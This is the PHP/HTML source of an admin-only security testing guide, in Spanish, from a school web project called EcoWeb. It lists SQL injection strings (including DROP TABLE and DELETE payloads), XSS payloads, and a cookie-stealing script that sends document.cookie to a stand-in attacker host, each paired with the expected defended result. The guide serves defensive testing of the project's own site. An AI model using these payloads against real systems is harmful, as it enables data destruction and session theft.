<?php
// Inicializar seguridad ANTES del header
require_once "../data/seguridad.php";
require_once "../data/conexion.php";

// Iniciar sesión segura
iniciarSesionSegura();

// Guía de Pruebas de Seguridad - Acceso restringido a admin
include "layout/header.php";

if (!isset($_SESSION['id']) || $_SESSION['rol'] !== 'admin') {
    header("Location: index.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guía de Pruebas de Seguridad - EcoWeb</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1, h2 { color: #d32f2f; }
        .test-section { margin: 30px 0; }
        .test-case { 
            background: #fff3cd; 
            padding: 15px; 
            border-left: 4px solid #ffc107;
            margin: 15px 0;
            border-radius: 4px;
        }
        .expected { 
            background: #d4edda; 
            padding: 10px; 
            margin: 10px 0;
            border-radius: 4px;
            border-left: 4px solid #28a745;
        }
        .warning {
            background: #f8d7da;
            padding: 15px;
            border-left: 4px solid #d32f2f;
            margin: 15px 0;
            border-radius: 4px;
        }
        code {
            background: #f0f0f0;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        .step {
            padding: 10px;
            margin: 10px 0;
            background: #f9f9f9;
            border-left: 3px solid #1976d2;
        }
        .result {
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
        }
        .result.pass {
            background: #d4edda;
            border-left: 3px solid #28a745;
        }
        .result.fail {
            background: #f8d7da;
            border-left: 3px solid #d32f2f;
        }
        .btn-print {
            background-color: #d32f2f;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .btn-print:hover {
            background-color: #b71c1c;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }
        td {
            padding: 10px;
            border: 1px solid #ddd;
        }
        .nota {
            background: #e3f2fd;
            padding: 10px;
            border-left: 3px solid #2196f3;
            margin: 10px 0;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <button class="btn-print" onclick="window.print()">🧪 Imprimir Guía</button>
    
    <div class="container">
        <h1>🧪 Guía de Pruebas de Seguridad - EcoWeb</h1>
        <p><strong>Proyecto Escolar:</strong> Pruebas Básicas de Seguridad Web</p>
        <p><strong>Objetivo:</strong> Verificar que los controles de seguridad funcionan correctamente</p>
        <hr>

        <div class="warning">
            <strong>⚠️ IMPORTANTE:</strong> Esta guía contiene ejemplos de ataques. <strong>NUNCA</strong> uses estas técnicas en sistemas ajenos sin permiso expreso. Solo úsalas en tu propio entorno de prueba.
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>1️⃣ Pruebas de Inyección SQL</h2>
            <p><strong>Objetivo:</strong> Verificar que la aplicación resiste intentos de inyección SQL.</p>

            <div class="test-case">
                <h3>❌ Prueba 1: Inyección SQL en Login (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>Paso 1:</strong> Abre la página de login
                </div>

                <div class="step">
                    <strong>Paso 2:</strong> En el campo "Correo", ingresa:
                    <br><code>' OR '1'='1</code>
                    <br><code>admin' --</code>
                    <br><code>' OR 1=1 --</code>
                </div>

                <div class="step">
                    <strong>Paso 3:</strong> Ingresa cualquier contraseña
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>Mensaje: "Credenciales incorrectas" (genérico, no revelador)</li>
                        <li><strong>Nunca</strong> acceso a la cuenta</li>
                        <li>La consulta SQL debe ser segura gracias a Prepared Statements</li>
                    </ul>
                </div>

                <div class="nota">
                    <strong>ℹ️ ¿Por qué funciona?</strong> Las Prepared Statements separan el código SQL de los datos, por lo que los caracteres peligrosos (comillas, guiones) se tratan como datos, no como SQL.
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 2: Inyección SQL en Comentarios (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>Paso 1:</strong> Inicia sesión con una cuenta válida
                </div>

                <div class="step">
                    <strong>Paso 2:</strong> Ve a la sección de comentarios
                </div>

                <div class="step">
                    <strong>Paso 3:</strong> En el campo comentario, escribe:
                    <br><code>Comentario'; DROP TABLE comentarios; --</code>
                    <br><code>Prueba'); DELETE FROM usuarios WHERE 1=1; --</code>
                </div>

                <div class="step">
                    <strong>Paso 4:</strong> Envía el formulario
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>El texto se guarda como comentario normal</li>
                        <li><strong>NUNCA</strong> se ejecutan comandos SQL</li>
                        <li>La tabla comentarios no se borra</li>
                        <li>No hay error SQL que revele información</li>
                    </ul>
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 3: Union-Based SQL Injection (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>En el login, correo:</strong>
                    <br><code>' UNION SELECT 1,2,3,4,5 --</code>
                    <br><code>' UNION ALL SELECT password FROM usuarios --</code>
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>Mensaje de error genérico: "Credenciales incorrectas"</li>
                        <li>Nunca se devuelven datos de otras tablas</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>2️⃣ Pruebas de XSS (Cross-Site Scripting)</h2>
            <p><strong>Objetivo:</strong> Verificar que la aplicación escapa correctamente el HTML.</p>

            <div class="test-case">
                <h3>❌ Prueba 1: Alert XSS en Comentarios (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>Paso 1:</strong> Inicia sesión
                </div>

                <div class="step">
                    <strong>Paso 2:</strong> Ve a comentarios
                </div>

                <div class="step">
                    <strong>Paso 3:</strong> En el comentario, escribe:
                    <br><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                </div>

                <div class="step">
                    <strong>Paso 4:</strong> Envía y actualiza la página
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li><strong>NO</strong> debe aparecer un alert</li>
                        <li>El script debe verse como texto: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                        <li>El HTML se escapó correctamente</li>
                    </ul>
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 2: Image XSS Handler (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>Comentario:</strong>
                    <br><code>&lt;img src=x onerror="alert('XSS')"&gt;</code>
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>No debe ejecutarse el evento onerror</li>
                        <li>Se debe ver como texto HTML escapado</li>
                    </ul>
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 3: SVG XSS (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>Comentario:</strong>
                    <br><code>&lt;svg onload="alert('XSS')"&gt;&lt;/svg&gt;</code>
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>NO ejecuta el onload</li>
                        <li>Se ve como texto seguro</li>
                    </ul>
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 4: Cookie Stealing XSS (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>Comentario (intento de robo de sesión):</strong>
                    <br><code>&lt;script&gt;fetch('http://atacante.com?c='+document.cookie)&lt;/script&gt;</code>
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>No debe ejecutarse</li>
                        <li>Las cookies tienen flagHttpOnly, no accesible desde JS</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>3️⃣ Pruebas de CSRF (Cross-Site Request Forgery)</h2>
            <p><strong>Objetivo:</strong> Verificar que los tokens CSRF protegen contra solicitudes falsas.</p>

            <div class="test-case">
                <h3>❌ Prueba 1: Formulario sin Token CSRF (Debe SER RECHAZADO)</h3>
                
                <div class="step">
                    <strong>Paso 1:</strong> Abre las herramientas de desarrollador (F12)
                </div>

                <div class="step">
                    <strong>Paso 2:</strong> Dirígete a la pestaña Inspector/Elements
                </div>

                <div class="step">
                    <strong>Paso 3:</strong> Busca un formulario de comentarios
                </div>

                <div class="step">
                    <strong>Paso 4:</strong> Elimina manualmente el campo:
                    <br><code>&lt;input type="hidden" name="csrf_token" value="..."&gt;</code>
                </div>

                <div class="step">
                    <strong>Paso 5:</strong> Intenta enviar el formulario
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>Mensaje de error: "Token de seguridad inválido"</li>
                        <li>El comentario <strong>NO</strong> se guarda</li>
                    </ul>
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 2: Token CSRF modificado (Debe SER RECHAZADO)</h3>
                
                <div class="step">
                    <strong>Paso 1:</strong> Abre DevTools (F12)
                </div>

                <div class="step">
                    <strong>Paso 2:</strong> Busca el campo csrf_token en el formulario
                </div>

                <div class="step">
                    <strong>Paso 3:</strong> Cambia su valor a algo diferente:
                    <br><code>&lt;input type="hidden" name="csrf_token" value="token_falso"&gt;</code>
                </div>

                <div class="step">
                    <strong>Paso 4:</strong> Intenta enviar
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>Error: "Token de seguridad inválido"</li>
                        <li>La acción es rechazada</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>4️⃣ Pruebas de Validación de Entrada</h2>
            <p><strong>Objetivo:</strong> Verificar que los datos se validen correctamente.</p>

            <table>
                <tr>
                    <td><strong>Prueba</strong></td>
                    <td><strong>Entrada</strong></td>
                    <td><strong>Resultado Esperado</strong></td>
                </tr>
                <tr>
                    <td>Email inválido</td>
                    <td><code>notaunemail</code></td>
                    <td>Rechazo del navegador o servidor</td>
                </tr>
                <tr>
                    <td>Contraseña muy corta</td>
                    <td><code>123Ab</code> (5 caracteres)</td>
                    <td>Mensaje: "mínimo 6 caracteres"</td>
                </tr>
                <tr>
                    <td>Contraseña sin mayúscula</td>
                    <td><code>abcdef123</code></td>
                    <td>Mensaje: "al menos 1 mayúscula"</td>
                </tr>
                <tr>
                    <td>Contraseña sin número</td>
                    <td><code>Abcdefgh</code></td>
                    <td>Mensaje: "al menos 1 número"</td>
                </tr>
                <tr>
                    <td>Nombre demasiado corto</td>
                    <td><code>AB</code></td>
                    <td>Rechazo en registro</td>
                </tr>
                <tr>
                    <td>Comentario muy corto</td>
                    <td><code>Hi</code></td>
                    <td>Mensaje: "mínimo 5 caracteres"</td>
                </tr>
            </table>
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>5️⃣ Pruebas de Manipulación de URL</h2>
            <p><strong>Objetivo:</strong> Verificar que parámetros en URL no permitan acceso no autorizado.</p>

            <div class="test-case">
                <h3>❌ Prueba 1: Acceso Directo a Áreas Restringidas (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>Cierra sesión</strong>
                </div>

                <div class="step">
                    <strong>Intenta acceder directamente a:</strong>
                    <br><code>http://localhost/EcoWeb/presentation/comentarios.php</code>
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>Redirección automática a login.php</li>
                        <li>Mensaje de sesión no iniciada</li>
                    </ul>
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 2: Cambiar ID en URL (Debe SER SEGURO)</h3>
                
                <div class="step">
                    <strong>Intenta modificar el ID de usuario en URL (si existe):</strong>
                    <br><code>?usuario_id=2</code> o <code>?id=999</code>
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>No debe permitir que veas datos de otros usuarios</li>
                        <li>Los permisos deben validarse en backend (no solo frontend)</li>
                    </ul>
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 3: Acceso a Área Admin (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>Inicia sesión como usuario normal</strong>
                </div>

                <div class="step">
                    <strong>Intenta acceder a documentacion_seguridad.php</strong>
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>Redirección a index.php o mensaje de acceso denegado</li>
                        <li>Solo admin debe acceder</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>6️⃣ Pruebas de Sesión y Cookies</h2>
            <p><strong>Objetivo:</strong> Verificar que las cookies sean seguras.</p>

            <div class="test-case">
                <h3>✅ Prueba 1: Inspeccionar Flags de Cookie</h3>
                
                <div class="step">
                    <strong>Paso 1:</strong> Inicia sesión
                </div>

                <div class="step">
                    <strong>Paso 2:</strong> Abre DevTools (F12) → Aplicación/Storage → Cookies
                </div>

                <div class="step">
                    <strong>Paso 3:</strong> Busca la cookie PHPSESSID
                </div>

                <div class="expected">
                    <strong>✅ Verifica que tenga:</strong>
                    <ul>
                        <li><strong>HttpOnly:</strong> Sí (protege contra XSS)</li>
                        <li><strong>Secure:</strong> En producción debe ser Sí</li>
                        <li><strong>SameSite:</strong> Strict (protege contra CSRF)</li>
                    </ul>
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 2: Acceso desde JavaScript (Debe FALLAR)</h3>
                
                <div class="step">
                    <strong>Paso 1:</strong> Abre la consola (F12 → Consola)
                </div>

                <div class="step">
                    <strong>Paso 2:</strong> Intenta:
                    <br><code>console.log(document.cookie)</code>
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>Debe devolver una cadena vacía u otro valor</li>
                        <li><strong>NO</strong> debe mostrar PHPSESSID</li>
                        <li>Esto prueba que HttpOnly funciona</li>
                    </ul>
                </div>

                <div class="nota">
                    <strong>ℹ️ Nota:</strong> Si HttpOnly estuviera deshabilitado, verías la cookie de sesión completa, ¡un riesgo de seguridad!
                </div>
            </div>
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>7️⃣ Pruebas de Contraseñas</h2>
            <p><strong>Objetivo:</strong> Verificar que las contraseñas se almacenen de forma segura.</p>

            <div class="test-case">
                <h3>✅ Prueba 1: Verificar Hash de Contraseña</h3>
                
                <div class="step">
                    <strong>Paso 1:</strong> Accede a phpMyAdmin
                </div>

                <div class="step">
                    <strong>Paso 2:</strong> Abre la tabla 'usuarios'
                </div>

                <div class="step">
                    <strong>Paso 3:</strong> Observa la columna 'password'
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>Debe ver algo como: <code>$2y$10$...</code> (bcrypt hash)</li>
                        <li><strong>NUNCA</strong> debe ver la contraseña en texto plano</li>
                        <li><strong>NUNCA</strong> debe ser MD5 o SHA1 (demasiado débil)</li>
                    </ul>
                </div>
            </div>

            <div class="test-case">
                <h3>❌ Prueba 2: Intentos de Fuerza Bruta</h3>
                
                <div class="step">
                    <strong>Intenta hacer login 5+ veces con contraseña incorrecta</strong>
                </div>

                <div class="expected">
                    <strong>✅ Resultado Esperado:</strong>
                    <ul>
                        <li>Mensaje: "Demasiados intentos. Intenta después"</li>
                        <li>Se bloquean más intentos por un tiempo</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>8️⃣ Pruebas de Control de Acceso</h2>
            <p><strong>Objetivo:</strong> Verificar que solo usuarios autorizados puedan realizar ciertas acciones.</p>

            <table>
                <tr>
                    <td><strong>Acción</strong></td>
                    <td><strong>Rol Usuario</strong></td>
                    <td><strong>Rol Admin</strong></td>
                </tr>
                <tr>
                    <td>Comentar</td>
                    <td>✅ Sí</td>
                    <td>✅ Sí</td>
                </tr>
                <tr>
                    <td>Responder comentario</td>
                    <td>❌ No</td>
                    <td>✅ Sí</td>
                </tr>
                <tr>
                    <td>Borrar comentario</td>
                    <td>❌ No</td>
                    <td>✅ Sí</td>
                </tr>
                <tr>
                    <td>Ver documentación</td>
                    <td>❌ No</td>
                    <td>✅ Sí</td>
                </tr>
            </table>

            <div class="paso">
                <strong>Prueba:</strong> Inicia sesión como usuario normal e intenta responder/borrar un comentario. Debe ser rechazado.
            </div>
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>9️⃣ Checklist Final de Seguridad</h2>
            
            <table>
                <tr>
                    <td><strong>Elemento</strong></td>
                    <td><strong>Estado</strong></td>
                    <td><strong>Notas</strong></td>
                </tr>
                <tr>
                    <td>Consultas preparadas (Prepared Statements)</td>
                    <td>✅ Implementado</td>
                    <td>Previene SQL injection</td>
                </tr>
                <tr>
                    <td>Escapado HTML (htmlspecialchars)</td>
                    <td>✅ Implementado</td>
                    <td>Previene XSS</td>
                </tr>
                <tr>
                    <td>Tokens CSRF</td>
                    <td>✅ Implementado</td>
                    <td>Previene CSRF</td>
                </tr>
                <tr>
                    <td>Validación de entrada</td>
                    <td>✅ Implementado</td>
                    <td>Email, contraseña, nombre, etc.</td>
                </tr>
                <tr>
                    <td>Hash bcrypt</td>
                    <td>✅ Implementado</td>
                    <td>Contraseñas seguras</td>
                </tr>
                <tr>
                    <td>Cookies HttpOnly</td>
                    <td>✅ Implementado</td>
                    <td>Protege sesión contra XSS</td>
                </tr>
                <tr>
                    <td>SameSite Cookies</td>
                    <td>✅ Implementado</td>
                    <td>Protege contra CSRF</td>
                </tr>
                <tr>
                    <td>Rate Limiting</td>
                    <td>✅ Implementado</td>
                    <td>Protege contra fuerza bruta</td>
                </tr>
                <tr>
                    <td>Control de Acceso (Roles)</td>
                    <td>✅ Implementado</td>
                    <td>Admin vs Usuario</td>
                </tr>
                <tr>
                    <td>Charset UTF-8</td>
                    <td>✅ Implementado</td>
                    <td>Evita ataques de encoding</td>
                </tr>
            </table>
        </div>

        <!-- ====================================== -->
        <div class="test-section">
            <h2>🔟 Cómo Documentar los Resultados</h2>

            <div class="nota">
                <strong>Guarda un reporte como este:</strong>
                <br><br>
                <strong>Prueba:</strong> XSS en Comentarios<br>
                <strong>Entrada:</strong> &lt;script&gt;alert('test')&lt;/script&gt;<br>
                <strong>Resultado:</strong> ✅ PASÓ - El script se escapó correctamente<br>
                <strong>Conclusión:</strong> Protección contra XSS: FUNCIONA<br>
            </div>
        </div>

        <hr>
        <p style="text-align: center; color: #666; margin-top: 40px;">
            <strong>Guía de Pruebas de Seguridad - EcoWeb</strong><br>
            Proyecto Escolar - Febrero 2026<br>
            Solo para fines educativos
        </p>
    </div>

    <script>
        // Pequeño script para contar pruebas pasadas
        document.addEventListener('DOMContentLoaded', function() {
            console.log('Guía de pruebas cargada. Comienza a probar las vulnerabilidades.');
        });
    </script>
</body>
</html>
